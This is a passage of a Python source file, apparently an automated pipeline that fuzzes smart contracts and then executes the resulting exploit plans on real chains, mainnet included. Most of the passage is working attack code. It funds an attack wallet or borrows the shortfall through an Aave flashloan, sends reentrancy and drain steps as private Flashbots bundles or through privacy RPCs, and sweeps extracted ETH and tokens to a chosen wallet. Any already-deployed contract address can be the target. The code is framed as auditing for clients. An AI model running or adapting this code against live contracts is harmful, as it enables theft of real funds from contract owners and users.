            f"{FLASHBOTS_THRESHOLD_ETH} {native_symbol_for_w3(w3)} threshold -- the protected step sequence below "
            f"will be submitted as one atomic Flashbots bundle to {bundle_relay} instead of separate public "
            "transactions."
        )
    elif use_privacy_redirect:
        tee.log(
            f"Value at risk ({Web3.from_wei(total_value, 'ether')}) is over the "
            f"{privacy_redirect['threshold_native']} threshold on '{chain}' -- each protected step will be "
            f"submitted via {privacy_redirect['url']} instead of the public mempool (single-tx privacy "
            "redirect, not an atomic bundle -- see PRIVACY_REDIRECT_RPC's own comment for why)."
        )
    already_executed_via_flashloan = False
    if total_value > 0:
        bal = w3.eth.get_balance(Web3.to_checksum_address(attack_wallet))
        if bal < total_value:
            shortfall = total_value - bal
            signer_bal = w3.eth.get_balance(acct.address)
            if shortfall > signer_bal:
                # The fuzzer explores with an effectively unlimited
                # simulated balance, so the exact amount a found trace
                # happens to use can be an arbitrary, unrealistically
                # large number -- it isn't necessarily essential to the
                # bug itself, just whatever the search landed on.
                if plan["kind"] == "flat" and chain in AAVE_V3_POOLS and chain in WETH_ADDRESSES:
                    # The "zero attacker capital" path: borrow the
                    # shortfall as WETH from this chain's real Aave V3
                    # pool instead of giving up. Scoped to "flat" plans
                    # on chains with a live-verified Aave pool AND a
                    # live-verified wrapped-native token (see chains.py's
                    # own doc comments on AAVE_V3_POOLS/WETH_ADDRESSES for
                    # why that scope is deliberately narrow right now).
                    tee.log(
                        f"Signer only holds {signer_bal} wei, {shortfall} wei short of this plan's "
                        f"{total_value} wei total -- attempting a real Aave V3 WETH flashloan on '{chain}' "
                        "instead of giving up."
                    )
                    ok, msg = execute_flat_plan_via_flashloan(
                        w3, acct, nonce_box, attack_wallet, plan, chain, total_value, bal, tee,
                        use_bundle=use_bundle, submit_w3=submit_w3, gas_ledger=gas_ledger,
                    )
                    if not ok:
                        tee.log(f"NOT CONFIRMED: {msg}")
                        return _result(PLAN_NOT_CONFIRMED, 0)
                    tee.log(f"Flashloan-funded plan succeeded: {msg}")
                    already_executed_via_flashloan = True
                else:
                    # Skip rather than attempt a top-up transaction that
                    # would just fail outright for insufficient real
                    # funds, and rather than attempt a flashloan this
                    # plan/chain combination isn't scoped for yet (a
                    # "reentrancy" plan, or a chain with no live-verified
                    # Aave pool/WETH address -- including ETC/Mordor,
                    # where Aave genuinely doesn't exist).
                    tee.log(
                        f"INCONCLUSIVE: plan needs {shortfall} more wei than AttackWallet has, but the signer only "
                        f"holds {signer_bal} wei -- this specific trace's amount isn't realistically fundable "
                        f"(kind={plan['kind']!r}, chain={chain!r} flashloan-eligible="
                        f"{chain in AAVE_V3_POOLS and chain in WETH_ADDRESSES}). (The underlying bug may still be "
                        "exploitable with a smaller amount; this run doesn't attempt to find one.)"
                    )
                    return _result(PLAN_INCONCLUSIVE, 0)
            else:
                tee.log(f"AttackWallet balance {bal} < needed {total_value}, topping up by {shortfall} wei.")
                if not send_call(
                    w3, acct, nonce_box, attack_wallet, b"", tee, "Fund AttackWallet", value=shortfall,
                    gas_ledger=gas_ledger,
                ):
                    tee.log("INCONCLUSIVE: funding AttackWallet itself failed (infra issue, not a signal about the bug) -- aborting this plan.")
                    return _result(PLAN_INCONCLUSIVE, 0)

    steps = plan["steps"]
    repeat_step = plan.get("repeat_step")

    if already_executed_via_flashloan:
        pass
    elif use_bundle:
        # Atomic path: every protected call is pre-signed up front (none
        # sent yet) in exactly the order the sequential path below would
        # have sent them, then submitted together as ONE bundle. Because
        # inclusion is all-or-nothing, there is no mid-sequence failure
        # state to clean up here -- either every call in it succeeded (so
        # it landed) or NONE of them touched real chain state at all (so
        # there's nothing to disarm/undo), unlike the sequential path's
        # own "cleanup" branch below.
        protected_calls = []
        for i, step in enumerate(steps):
            is_last = i == len(steps) - 1
            value = parse_pretty_wei(step.get("value"))
            inner_calldata = bytes.fromhex(step["calldata"])
            if is_last and plan["kind"] == "reentrancy" and repeat_step:
                repeat_calldata = bytes.fromhex(repeat_step["calldata"])
                arm_data = attack_wallet_arm_callback_calldata(repeat_step["contract"], repeat_calldata)
                protected_calls.append((attack_wallet, arm_data, 0, f"armCallback (step {i})"))
            exec_data = attack_wallet_execute_calldata(step["contract"], inner_calldata, value)
            protected_calls.append((attack_wallet, exec_data, value, f"execute step {i}/{len(steps)}"))
        if plan["kind"] == "reentrancy" and repeat_step:
            protected_calls.append((attack_wallet, attack_wallet_disarm_callback_calldata(), 0, "disarmCallback"))

        # Builder tip, paid INSIDE the bundle itself (not as an off-chain
        # priority-fee guess -- see AttackWallet.sol's sweepWithBuilderTip
        # for why an earlier version of this, based on the plan's
        # total_value, was wrong: that is the value AT RISK across the
        # exploit's steps, not the actual profit, and could have tipped
        # away far more than was ever extracted). This also means the
        # recovery sweep below naturally becomes a no-op for this path --
        # AttackWallet's balance is already 0 by the time it runs. No
        # destination argument here either -- sweepWithBuilderTip always
        # pays whatever safe wallet get_or_deploy_attack_wallet already
        # locked this instance to (verified == recovery_wallet there).
        protected_calls.append(
            (
                attack_wallet,
                attack_wallet_sweep_with_builder_tip_calldata(BUNDLE_BUILDER_TIP_BPS),
                0,
                f"sweepWithBuilderTip ({BUNDLE_BUILDER_TIP_BPS / 100}% to block.coinbase, rest to locked safe wallet {recovery_wallet})",
            )
        )

        fee_fields = get_fee_fields(w3, chain)
        start_nonce = nonce_box["nonce"]
        raw_txs, tx_hashes = [], []
        for offset, (to, data, value, label) in enumerate(protected_calls):
            raw_hex, tx_hash = sign_step(w3, acct, start_nonce + offset, to, data, value, fee_fields)
            raw_txs.append(raw_hex)
            tx_hashes.append(tx_hash)
            tee.log(f"Pre-signed for bundle: {label} (tx {tx_hash})")

        # One plan = one bounded gas budget: a REAL simulation of this
        # EXACT signed bundle (eth_callBundle's own totalGasUsed, not a
        # guess) times GAS_BUDGET_MARGIN, computed BEFORE any real
        # submission. The real landed cost is checked against it below --
        # under normal EVM gas-limit rules this can't actually be
        # exceeded (gas used can't exceed gas limit, and maxFeePerGas is
        # already the hard per-unit ceiling), so this is a defensive
        # assertion on top of the circuit breaker's real enforcement
        # point, which is simply never signing more than this plan's own
        # steps in the first place.
        sim = call_bundle(bundle_relay, acct, raw_txs, w3.eth.block_number + 1)
        total_gas_used = sim.get("totalGasUsed") or len(protected_calls) * BUNDLE_GAS_LIMIT
        gas_cap_wei = int(total_gas_used * fee_fields["maxFeePerGas"] * GAS_BUDGET_MARGIN)
        tee.log(
            f"Gas budget for this plan: {total_gas_used} gas simulated * {GAS_BUDGET_MARGIN} margin "
            f"= {Web3.from_wei(gas_cap_wei, 'ether')} {native_symbol_for_w3(w3)} cap."
        )

        landed = submit_bundle_and_wait(w3, acct, raw_txs, tx_hashes, bundle_relay, tee)
        if not landed:
            tee.log(
                "NOT CONFIRMED: the protected bundle never landed on-chain (either a step would have reverted, "
                "caught by simulation before submitting, or builders never included it within the retry window). "
                "Nothing in it touched real chain state -- safe to retry.",
                alert=True,
            )
            return _result(PLAN_NOT_CONFIRMED, 0)

        nonce_box["nonce"] = start_nonce + len(protected_calls)
        all_ok = True
        total_actual_wei = 0
        for (to, data, value, label), tx_hash in zip(protected_calls, tx_hashes):
            receipt = w3.eth.get_transaction_receipt(tx_hash)
            ok = receipt.status == 1
            all_ok = all_ok and ok
            total_actual_wei += gas_ledger.record(receipt)
            tee.log(f"{label}: status={'OK' if ok else 'REVERTED'} (bundle) -- {describe_actual_cost(w3, receipt)}")
        if total_actual_wei > gas_cap_wei:
            tee.log(
                f"Real gas cost ({Web3.from_wei(total_actual_wei, 'ether')} ETH) exceeded this plan's "
                f"{Web3.from_wei(gas_cap_wei, 'ether')} ETH budget -- should not be possible under normal gas "
                "rules; flagging loudly rather than silently ignoring it.",
                alert=True,
            )
        if not all_ok:
            # Should not happen for an un-flagged bundle (a reverting step
            # should have kept the whole bundle from landing at all) --
            # logged loudly rather than silently trusted, since real
            # money already moved on-chain either way by this point.
            tee.log("Bundle landed but at least one step's receipt shows REVERTED -- treating as NOT CONFIRMED.", alert=True)
            return _result(PLAN_NOT_CONFIRMED, 0)
    else:
        # One plan = one bounded gas budget here too (see gas_utils.
        # GasBudget): the first step's own eth_estimateGas is a REAL
        # measurement (accurate specifically because nothing in this
        # plan has executed yet, so there's no staleness risk the way
        # there would be estimating a LATER step against not-yet-applied
        # earlier state), extrapolated across every call this plan is
        # actually, knowably going to make -- not a guessed constant.
        fee_fields = get_fee_fields(w3, chain)
        num_total_calls = len(steps) + (2 if plan["kind"] == "reentrancy" and repeat_step else 0)
        # W4: a multi-step FLAT plan is executed ATOMICALLY through
        # AttackWallet.executeBatch -- the whole (unlock -> use -> drain)
        # sequence in ONE transaction, with no block boundary or
        # front-running window between the steps and no chance of leaving a
        # half-applied sequence on-chain if a later step fails. A reentrancy
        # plan keeps the sequential path (its arm/disarm calls interleave the
        # repeat step), and a single-step plan stays a plain execute().
        use_batch = plan["kind"] == "flat" and len(steps) > 1
        if use_batch:
            batch_targets = [s["contract"] for s in steps]
            batch_datas = [bytes.fromhex(s["calldata"]) for s in steps]
            batch_values = [parse_pretty_wei(s.get("value")) for s in steps]
            first_exec_data = attack_wallet_execute_batch_calldata(batch_targets, batch_datas, batch_values)
            first_value = 0  # value is carried per-step inside the batch
            num_total_calls = 1
        else:
            first_step = steps[0]
            first_value = parse_pretty_wei(first_step.get("value"))
            first_exec_data = attack_wallet_execute_calldata(first_step["contract"], bytes.fromhex(first_step["calldata"]), first_value)
        # This is specifically where a revm-simulated (no gas metering --
        # see CLAUDE.md) "CONFIRMED" trace can turn out to be physically
        # unexecutable on the real chain: eth_estimateGas itself returns a
        # number bigger than any real block could ever hold. Caught HERE,
        # before any real tx is built or signed, rather than letting it
        # surface later as a raw eth_sendRawTransaction rejection.
        try:
            first_gas_estimate = estimate_gas_limit(
                w3,
                {
                    "from": acct.address,
                    "to": Web3.to_checksum_address(attack_wallet),
                    "data": first_exec_data,
                    "value": first_value,
                    "chainId": w3.eth.chain_id,
                    "nonce": nonce_box["nonce"],
                },
            )
        except GasExceedsBlockLimitError as e:
            tee.log(f"NOT CONFIRMED: {e}", alert=True)
            return _result(PLAN_NOT_CONFIRMED, 0)
        except ContractLogicError as e:
            # The estimate call itself reverted -- i.e. the plan's FIRST step
            # reverts against real chain state (AttackWallet.execute now
            # bubbles the inner revert, so this is a real revert, not a
            # gas-size problem). That is exactly a NOT CONFIRMED plan (the
            # fuzzer's simulated trace did not reproduce), NOT an
            # inconclusive one: without this the ContractLogicError escaped
            # to the generic per-plan handler and the plan was mislabelled
            # INCONCLUSIVE, hiding a genuine "reverts on real state" result.
            tee.log(
                f"NOT CONFIRMED: plan '{plan.get('contract_name', '?')}' reverts against real chain state at "
                f"eth_estimateGas (the fuzzer's simulated trace did not reproduce): {e}",
                alert=True,
            )
            return _result(PLAN_NOT_CONFIRMED, 0)
        gas_cap_wei = int(first_gas_estimate * num_total_calls * fee_fields["maxFeePerGas"] * GAS_BUDGET_MARGIN)
        tee.log(
            f"Gas budget for this plan: {first_gas_estimate} gas (measured for the first step) * {num_total_calls} "
            f"planned call(s) * {GAS_BUDGET_MARGIN} margin = {Web3.from_wei(gas_cap_wei, 'ether')} {native_symbol_for_w3(w3)} cap."
        )
        gas_budget = GasBudget(gas_cap_wei)

        try:
            if use_batch:
                # W4: the whole sequence in one atomic tx.
                ok = send_call(
                    w3, acct, nonce_box, attack_wallet, first_exec_data, tee,
                    f"executeBatch ({len(steps)} steps, atomic)", value=0,
                    submit_w3=submit_w3, gas_budget=gas_budget, gas_ledger=gas_ledger,
                )
                if not ok:
                    reason = revert_reason(w3, {
                        "from": acct.address, "to": Web3.to_checksum_address(attack_wallet),
                        "data": first_exec_data, "value": 0,
                    })
                    which = first_failing_step_index(w3, acct, attack_wallet, steps)
                    where = (
                        f" (best-effort prefix replay points at step {which}/{len(steps)}: "
                        f"{steps[which].get('contract')} {steps[which].get('fn_selector', '')})"
                        if which is not None else ""
                    )
                    why = f" -- reason: {reason}" if reason else ""
                    tee.log(
                        f"NOT CONFIRMED: the atomic {len(steps)}-step batch reverted on real chain state "
                        f"(the fuzzer's simulated trace didn't reproduce; being atomic, NOTHING was applied)"
                        f"{where}{why}.",
                        alert=True,
                    )
                    return _result(PLAN_NOT_CONFIRMED, 0)
            else:
                for i, step in enumerate(steps):
                    is_last = i == len(steps) - 1
                    value = parse_pretty_wei(step.get("value"))
                    inner_calldata = bytes.fromhex(step["calldata"])

                    if is_last and plan["kind"] == "reentrancy" and repeat_step:
                        repeat_calldata = bytes.fromhex(repeat_step["calldata"])
                        arm_data = attack_wallet_arm_callback_calldata(repeat_step["contract"], repeat_calldata)
                        if not send_call(
                            w3, acct, nonce_box, attack_wallet, arm_data, tee, f"armCallback (step {i})", submit_w3=submit_w3, gas_budget=gas_budget,
                            gas_ledger=gas_ledger):
                            tee.log("NOT CONFIRMED: armCallback itself reverted -- aborting this plan.")
                            return _result(PLAN_NOT_CONFIRMED, 0)

                    exec_data = attack_wallet_execute_calldata(step["contract"], inner_calldata, value)
                    ok = send_call(
                        w3, acct, nonce_box, attack_wallet, exec_data, tee, f"execute step {i}/{len(steps)}",
                        value=value, submit_w3=submit_w3, gas_budget=gas_budget,
                        gas_ledger=gas_ledger)
                    if not ok:
                        reason = revert_reason(w3, {
                            "from": acct.address, "to": Web3.to_checksum_address(attack_wallet),
                            "data": exec_data, "value": value,
                        })
                        why = f" -- reason: {reason}" if reason else ""
                        tee.log(f"NOT CONFIRMED: step {i} reverted on real chain state -- the fuzzer's simulated trace didn't reproduce (no further steps attempted; they depend on this one having succeeded){why}.")
                        if plan["kind"] == "reentrancy" and repeat_step:
                            send_call(
                                w3, acct, nonce_box, attack_wallet, attack_wallet_disarm_callback_calldata(), tee,
                                "disarmCallback (cleanup)", submit_w3=submit_w3, gas_budget=gas_budget,
                                gas_ledger=gas_ledger)
                        return _result(PLAN_NOT_CONFIRMED, 0)

                if plan["kind"] == "reentrancy" and repeat_step:
                    send_call(
                        w3, acct, nonce_box, attack_wallet, attack_wallet_disarm_callback_calldata(), tee,
                        "disarmCallback", submit_w3=submit_w3, gas_budget=gas_budget,
                        gas_ledger=gas_ledger)
        except (GasBudgetExceeded, GasExceedsBlockLimitError) as e:
            tee.log(f"NOT CONFIRMED: {e}", alert=True)
            return _result(PLAN_NOT_CONFIRMED, 0)

    bal = w3.eth.get_balance(Web3.to_checksum_address(attack_wallet))
    tee.log(f"AttackWallet balance after plan: {w3.from_wei(bal, 'ether')} {native_symbol_for_w3(w3)}")
    if bal > 0:
        # No destination argument -- always the locked safe wallet
        # (verified == recovery_wallet by get_or_deploy_attack_wallet).
        send_call(w3, acct, nonce_box, attack_wallet, attack_wallet_sweep_calldata(), tee, f"sweep to locked safe wallet {recovery_wallet}", gas_ledger=gas_ledger)

    # Raw ERC20-interface calls (transfer/transferFrom/mint/...) never
    # pass through the ETH-only sweep() above -- see
    # erc20_token_touched's own doc comment in src/evm/solution/mod.rs
    # for exactly which selectors tag a step's `contract` as a candidate
    # token here. Check AttackWallet's real balance of every token this
    # plan's steps actually touched, sweep whatever is there, and track
    # the recovery wallet's own before/after for each -- the same
    # deterministic-proof discipline as the ETH delta below, just for a
    # second asset class.
    token_deltas: dict = {}
    stolen_assets = sorted({step["stolen_asset"] for step in plan["steps"] if step.get("stolen_asset")})
    # Whether the plan contains ANY step whose function selector is a known
    # ERC-20 money-mover (transfer/transferFrom/mint/burn/skim/approve). If it
    # does not, no token balance is ever checked below -- and the report must
    # say so, not claim "no token moved". `stolen_asset` is stamped by the Rust
    # layer only for those selectors (see erc20_token_touched in
    # src/evm/solution/mod.rs); a target that holds value in a token reached
    # some OTHER way (e.g. a plain `withdraw()` the fuzzer never tagged) leaves
    # this empty, and "we checked no token" is a different, weaker statement
    # than "we checked tokens and none moved".
    token_check_skipped = len(stolen_assets) == 0
    for token in stolen_assets:
        token_checksum = Web3.to_checksum_address(token)
        token_recovery_before = erc20_balance_of(w3, token_checksum, recovery_checksum)
        wallet_token_bal = erc20_balance_of(w3, token_checksum, attack_wallet)
        tee.log(f"AttackWallet balance of token {token_checksum} after plan: {wallet_token_bal} (raw units).")
        if wallet_token_bal > 0:
            send_call(
                w3, acct, nonce_box, attack_wallet,
                attack_wallet_sweep_token_calldata(token_checksum, wallet_token_bal), tee,
                f"sweepToken {token_checksum} to locked safe wallet {recovery_wallet}",
                gas_ledger=gas_ledger,
            )
        token_recovery_after = erc20_balance_of(w3, token_checksum, recovery_checksum)
        token_deltas[token_checksum] = token_recovery_after - token_recovery_before

    # The deterministic proof itself: every step above can succeed
    # without reverting (that only means the fuzzer's trace replayed
    # cleanly) while still moving zero real value -- e.g. a reentrancy
    # callback that fires but drains nothing, or a bundle whose builder
    # tip ate the whole extracted amount. CONFIRMED is reserved for the
    # one fact a client-facing report can stand behind: the recovery
    # wallet's own real on-chain balance (ETH and/or any token this plan
    # touched) measurably increased because of this specific plan.
    recovery_balance_after = w3.eth.get_balance(recovery_checksum)
    delta = recovery_balance_after - recovery_balance_before
    gained_tokens = {token: d for token, d in token_deltas.items() if d > 0}
    if delta > 0 or gained_tokens:
        token_note = "".join(f", +{d} of {token} (raw units)" for token, d in gained_tokens.items())
        net = net_profit_wei(delta, gas_ledger.spent_wei)
        # Report NET, not just gross: the gas bill is what the funding
        # wallet really paid, and a plan that gained less than it cost is
        # a net loss -- a bare "gained X" would overstate it.
        net_note = (
            f" -- net {format_wei_signed(w3, net)} {native_symbol_for_w3(w3)} after "
            f"{w3.from_wei(gas_ledger.spent_wei, 'ether')} {native_symbol_for_w3(w3)} gas "
            f"({gas_ledger.tx_count} tx)"
            + (f" -- NET LOSS, cost more gas than it recovered" if net < 0 else "")
        )
        tee.log(
            f"CONFIRMED: plan '{plan['contract_name']}' executed end to end on real chain state -- recovery "
            f"wallet {recovery_wallet} gained {w3.from_wei(delta, 'ether')} {native_symbol_for_w3(w3)} "
            f"(before={w3.from_wei(recovery_balance_before, 'ether')}, after={w3.from_wei(recovery_balance_after, 'ether')})"
            f"{token_note}{net_note}."
        )
        return _result(PLAN_CONFIRMED, delta)
    # Be precise about WHAT was checked: if the plan carried no recognized
    # ERC-20 money-mover step, no token balance was examined at all, and the
    # report must say "no token was checked" -- not the stronger, false
    # "no token moved". A target holding value in a token the fuzzer never
    # tagged would otherwise be reported as a clean no-profit run with no hint
    # that the token side was never inspected.
    if token_check_skipped:
        token_clause = (
            "NOTE: this plan contained no recognized ERC-20 money-mover step "
            "(transfer/transferFrom/mint/burn/skim/approve), so NO token balance was checked at all -- "
            "if the target holds value in a token reached another way, that value was not looked for here."
        )
    else:
        token_clause = "in any token this plan touched"
    tee.log(
        f"EXECUTED, NO PROFIT: plan '{plan['contract_name']}' ran every step without reverting, but recovery "
        f"wallet {recovery_wallet}'s real balance did not increase, in {native_symbol_for_w3(w3)} or {token_clause} "
        f"(before={w3.from_wei(recovery_balance_before, 'ether')} {native_symbol_for_w3(w3)}, after={w3.from_wei(recovery_balance_after, 'ether')} {native_symbol_for_w3(w3)}). "
        "This is NOT a confirmed exploit for client-reporting purposes -- the bug fired but this trace extracted "
        "no real funds.",
        alert=True,
    )
    return _result(PLAN_EXECUTED_NO_PROFIT, 0)


def build_parser() -> argparse.ArgumentParser:
    """Factored out of main() (2026-11-02) so dashboard_server.py can
    introspect the REAL CLI surface (flag names/types/choices/help) to
    build its own launch form from, instead of a hand-maintained,
    drift-prone copy -- see that file's own module doc."""
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--target", required=True, help="Path to .sol/.bin to deploy, or an already-deployed 0x address")
    parser.add_argument("--recovery-wallet", required=True, help="Address every recovered asset is swept to")
    parser.add_argument(
        "--key",
        required=True,
        help="Path to the funding wallet's private key file -- pays every gas fee this run incurs (bounded per "
        "plan by GAS_BUDGET_MARGIN, see gas_utils.GasBudget). Required, no default: this, --target, and "
        "--recovery-wallet are the three addresses this run commits to -- funding wallet, target contract(s), "
        "and final profit destination -- and none of them should ever be silently assumed.",
    )
    parser.add_argument("--chain", default="sepolia", choices=known_chains())
    parser.add_argument(
        "--confirm-mainnet",
        action="store_true",
        help="Required to run against any chain not in chains.TESTNET_CHAINS -- this signs and "
        "sends real transactions (funding, deployment, exploit execution), so a non-testnet "
        "chain means real value at stake.",
    )
    parser.add_argument("--fund-eth", type=float, default=0.0, help="ETH to send the target if it has zero balance")
    parser.add_argument(
        "--no-gas-oracle",
        action="store_true",
        help="Skip the official explorer gas-PRICE oracle (Etherscan v2 for ETH, Blockscout v2 "
        "for ETC) and price every transaction from the node's own quote only. On by default "
        "because a legacy chain (ETC) has no refund mechanism, so a padded node gasPrice is "
        "paid in full on every tx; the oracle uses the chain's own official market median "
        "instead. Best-effort: any official-source failure already degrades to the node quote, "
        "so this flag only forces that path for a fully offline/deterministic run.",
    )
    parser.add_argument("--fuzz-seconds", type=int, default=300)
    parser.add_argument(
        "--detectors",
        default="all",
        help="Default 'all' -- was 'high_confidence' until a real session confirmed this caused a "
        "false sense of safety: a contract's only real finding (UncheckedCall, a heuristic but "
        "genuine bug class) is deliberately excluded from 'high_confidence' for its false-positive "
        "rate, so the default run reported nothing at all instead of a finding to weigh. Pass "
        "--detectors high_confidence explicitly for the old, lower-noise behavior.",
    )
    parser.add_argument(
        "--no-preflight",
        action="store_true",
        help="Skip the pre-flight profitability gate. On by default: before any plan is sent for "
        "real, the plan's own metadata is checked and the exact step sequence is replayed against a "
        "free, throwaway Anvil fork of the same node state -- a plan that provably reverts, or that "
        "moves value but costs more gas than it recovers, is skipped without signing anything. "
        "Confirmed live on ETC mainnet: 10 of 11 plans in one run ran cleanly and recovered nothing, "
        "one of them burning 7,878,136 gas (~0.0206 ETC) to do it -- every wei of that was avoidable. "
        "The gate degrades silently to 'attempt it' whenever Anvil is unavailable, so it can never "
        "make a run fail; pass this flag only to force the old, gate-free behavior.",
    )
    return parser


def main() -> int:
    args = build_parser().parse_args()

    require_mainnet_confirmation(args.chain, args.confirm_mainnet)

    run_id = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    tee = Tee(LOGS_DIR / f"auto_pipeline_{run_id}.log")
    tee.log(f"=== auto_pipeline run {run_id} ===")
    tee.log(f"target={args.target} chain={args.chain} recovery_wallet={args.recovery_wallet}")
    # Printed unconditionally so a run's log proves which gas cap is actually
    # loaded -- a stale checkout silently using the old, uncapped code is
    # otherwise indistinguishable from the cap not working.
    import gas_utils as _gas_utils
    tee.log(f"Gas limit cap: MAX_GAS_LIMIT={MAX_GAS_LIMIT} (from {_gas_utils.__file__}); every tx gas limit is clamped to it.")

    if args.no_gas_oracle:
        import gas_oracle
        gas_oracle.set_enabled(False)
        tee.log("Gas-fee oracle: DISABLED (--no-gas-oracle) -- pricing every tx from the node's own quote only.")
    else:
        tee.log("Gas-fee oracle: ENABLED -- pricing every tx from the chain's official explorer "
                "(Etherscan v2 for ETH, Blockscout v2 for ETC), falling back to the node quote on any failure.")

    try:
        key_path = Path(args.key)
        if not key_path.exists():
            tee.log(f"ERROR: key file {key_path} not found. Create it (one line, the signer's private key) and re-run.")
            return 1
        w3 = make_w3(args.chain)
        # Verify the RPC actually serves the chain --chain names, before any
        # wallet is even loaded, and adapt every network-dependent mechanism
        # to the DETECTED network (not the typed name). A stale
        # rpc_overrides.json entry or a typo'd --chain would otherwise be
        # discovered only from a wrong-chain broadcast.
        network = verify_rpc_identity(args.chain, tee, w3=w3)
        tee.log(f"Network detected from RPC: {network.describe()} (family={network.family}).")
        acct = Account.from_key(key_path.read_text().strip())
        enforce_wallet_policy(args.chain, acct.address, args.recovery_wallet)
        balance = w3.eth.get_balance(acct.address)
        tee.log(f"Signer: {acct.address}, balance {w3.from_wei(balance, 'ether')} {native_symbol_for_w3(w3)}")
        if balance == 0:
            tee.log("ERROR: signer wallet is not funded. Fund it and re-run.")
            return 1
        nonce_box = {"nonce": w3.eth.get_transaction_count(acct.address)}

        target_arg = args.target
        if target_arg.startswith("0x") and len(target_arg) == 42:
            target_address = Web3.to_checksum_address(target_arg)
            tee.log(f"Using already-deployed target {target_address}")
        else:
            target_path = Path(target_arg)
            if not target_path.exists():
                tee.log(f"ERROR: target path {target_path} does not exist.")
                return 1
            if target_path.suffix == ".sol":
                run_static_analysis(target_path, tee)
            else:
                tee.log("Target is a .bin with no source attached -- static analysis (Slither) needs source, skipping.")
            data = compile_contract(target_path, tee)
            target_address = deploy(w3, acct, nonce_box, data, tee, f"Target ({target_path.name})", chain=args.chain)

        register_contract(
            args.chain,
            target_address,
            source=target_arg,
            run_id=run_id,
            script="auto_pipeline",
            funding_wallet=acct.address,
            recovery_wallet=args.recovery_wallet,
        )

        if args.fund_eth > 0:
            current = w3.eth.get_balance(target_address)
            if current == 0:
                wei = w3.to_wei(args.fund_eth, "ether")
                tee.log(f"Funding target with {args.fund_eth} {native_symbol_for_w3(w3)} ...")
                send_call(w3, acct, nonce_box, target_address, b"", tee, "Fund target", value=wei)
            else:
                tee.log(f"Target already has {w3.from_wei(current, 'ether')} {native_symbol_for_w3(w3)}, skipping funding.")

        attack_wallet = get_or_deploy_attack_wallet(w3, acct, nonce_box, args.chain, args.recovery_wallet, tee)

        work_dir = HERE / "auto_work" / run_id

        # Discover the target's proxy stack from the Python side and hand
        # every implementation to the fuzzer as an additional target. The
        # Rust from_address() also expands proxies, so this is belt-and-
        # braces -- but doing it here means the run's OWN log states which
        # implementation(s) are in play (visibility the Rust side doesn't
        # surface), and a discovery failure degrades cleanly to the single
        # named target rather than blocking the run.
        proxy_info = resolve_proxy_chain(w3, target_address)
        if proxy_info["is_proxy"]:
            tee.log(
                f"Proxy detected at {target_address}: {len(proxy_info['implementations'])} implementation(s) "
                f"over {proxy_info['depth']} hop(s) -- {', '.join(proxy_info['implementations'])}. Fuzzing the "
                f"implementation(s) too, not just the dispatcher."
            )
        else:
            tee.log(f"{target_address} is not a recognized proxy (EIP-1967/UUPS/beacon/EIP-1167); fuzzing it directly.")
        extra_targets = proxy_info["implementations"]

        fuzz_seconds_actual = run_fuzzer(
            target_address, args.chain, args.detectors, args.fuzz_seconds, work_dir, tee, extra_targets=extra_targets
        )
        min_instr_pct, min_branch_pct = report_coverage(work_dir, tee)

        findings = strategy_layer.load_findings(work_dir)
        findings.sort(key=strategy_layer.ordering_key)
        plan_files = [f["plan_path"] for f in findings]
        tee.log(f"Found {len(plan_files)} exploit plan(s) after fuzzing.")
        vuln_file = work_dir / "vuln_info.jsonl"
        any_findings_at_all = vuln_file.exists() and vuln_file.stat().st_size > 0
        if not plan_files:
            tee.log("No fund-extraction/reentrancy exploit plan was generated this run (bug may still have been found -- see vuln_info.jsonl / the .t.sol reproductions in the work dir for anything not covered by atomic script generation).")
            # Only when literally NOTHING was flagged (not even a
            # sim-review heuristic) does "no exploit plan" amount to a
            # "no vulnerability found" claim worth formally scoring --
            # otherwise report_unexecuted_findings below already covers
            # "found something real, can't act on it automatically",
            # and printing a bounded "NO VULNERABILITY FOUND" verdict
            # alongside that would directly contradict it.
            if not any_findings_at_all:
                determine_negative_result_verdict(
                    min_instr_pct, min_branch_pct, fuzz_seconds_actual, args.detectors, args.chain, tee
                )
        report_unexecuted_findings(work_dir, len(plan_files), tee)
        report_surface_triage(findings, tee)

        # Every plan found gets tried, independently of whether an EARLIER
        # plan was confirmed or not -- one bug not reproducing on real
        # chain state says nothing about whether a different bug found in
        # the same run is real. Collecting a per-bug status list (not
        # just a count) is what actually gives a reliable "fix this,
        # ignore that" signal instead of one flat number.
        #
        # Before any plan is sent for real, the pre-flight gate (see
        # preflight_skip_reason) gets a free, throwaway Anvil fork of this
        # SAME node state. A plan that provably reverts or cannot out-earn
        # its own gas is skipped here, before a single wei is spent --
        # confirmed live on ETC mainnet that 10 of 11 plans in one run fit
        # exactly that description, one of them burning 7,878,136 gas to
        # move nothing.
        fork_proc, fork_w3 = (None, None)
        if not args.no_preflight:
            fork_proc, fork_w3 = _start_fork(args.chain, tee)
        native_symbol = native_symbol_for_w3(w3)

        def gated_execute_plan(w3_, acct_, nonce_box_, attack_wallet_, plan_, recovery_wallet_, tee_, chain="sepolia"):
            """execute_plan behind the pre-flight gate, so BOTH the independent
            pass and strategy_layer's composed attempts (phase 2) are gated
            identically -- a composed plan must clear the same free check as a
            standalone one before it is ever sent for real. Metadata defaults
            to replayable when a composed plan doesn't carry the fuzzer's own
            flags, so a composition is never skipped for a missing field.
            `--no-preflight` bypasses the ENTIRE gate (metadata included), not
            just the fork layer -- the flag means "run every plan for real",
            so it must not silently keep skipping on metadata.

            The `chain` parameter MUST keep this name: strategy_layer calls
            this callback as `execute_plan_fn(..., chain=chain)` (mirroring
            execute_plan's own signature), so a differently-named parameter
            (the historical `chain_`) made every composed attempt raise
            `TypeError: got an unexpected keyword argument 'chain'` -- which
            silently killed the whole strategy/chaining phase."""
            if args.no_preflight:
                return execute_plan(
                    w3_, acct_, nonce_box_, attack_wallet_, plan_, recovery_wallet_, tee_, chain=chain,
                    return_units=True,
                )
            finding_ = {
                "plan": plan_,
                "contract_name": plan_.get("contract_name", "?"),
                "kind": plan_.get("kind"),
                "atomic_replayable": plan_.get("atomic_replayable", True),
                "distinct_callers": plan_.get("distinct_callers", 1),
                "confirmed_exploitable": plan_.get("confirmed_exploitable", True),
                "owner_impersonation": plan_.get("owner_impersonation", False),
                "owner_gated": plan_.get("owner_gated", False),
            }
            reason = preflight_skip_reason(
                finding_, fork_w3, acct_, attack_wallet_, recovery_wallet_, chain, tee_, native_symbol
            )
            if reason is not None:
                tee_.log(
                    f"SKIP (pre-flight, no real tx sent): plan '{plan_.get('contract_name', '?')}' "
                    f"({plan_.get('kind', '?')}) -- {reason}."
                )
